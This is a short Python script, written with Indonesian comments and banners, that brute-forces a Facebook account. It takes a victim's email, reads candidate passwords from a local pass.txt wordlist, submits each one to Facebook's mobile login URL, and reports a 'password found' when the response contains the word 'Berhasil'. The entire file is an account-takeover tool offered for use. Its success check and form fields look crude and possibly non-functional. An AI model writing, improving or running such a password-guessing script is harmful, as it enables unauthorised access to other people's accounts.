#Jangan Direcode Ya Ngentod!

import requests , os

os.system('clear')

url = 'https://m.facebook.com/login/?ref=dbl&fl'

print ('<<=====================>>')
print ('    Created By Fxadfr')
print ('   github.com/Xclowns9')
print ('<<=====================>>\n')

user = input('Email > ')

print ('Ngopi Dulu Ae Coegg..\n')

password = open('pass.txt','r').readlines()


for line in password:
  pw = line.strip()

  http = requests.post(url, data={'user'
    :user,'password':pw,'submit':'submit'}
    )

  k = http.content

  if 'Berhasil'  in str(k):
    print('password found > ', pw)
  else:
    print('Password Not Found > ', pw)
